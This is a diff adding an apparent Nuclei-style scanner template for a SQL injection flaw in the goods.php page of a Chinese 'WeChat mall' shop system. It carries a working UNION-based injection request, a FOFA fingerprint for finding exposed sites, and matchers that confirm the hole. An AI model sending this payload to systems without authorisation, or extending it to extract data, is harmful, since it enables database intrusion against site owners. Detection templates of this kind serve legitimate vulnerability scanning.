@@ -1,0 +1,33 @@
+id: poc-yaml-wechat-mall-goods-php-sqli
+info:
+  name: 微商城系统 goods.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 微商城系统
+    fofa: body="/Mao_Public/js/jquery-2.1.1.min.js"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /goods.php?id=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5({{t1}})+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "img src=\"{{t2}}\""
+        part: body
+      - type: word
+        words:
+          - "/Mao_Public/js/jquery-2.1.1.min.js"
+        part: body
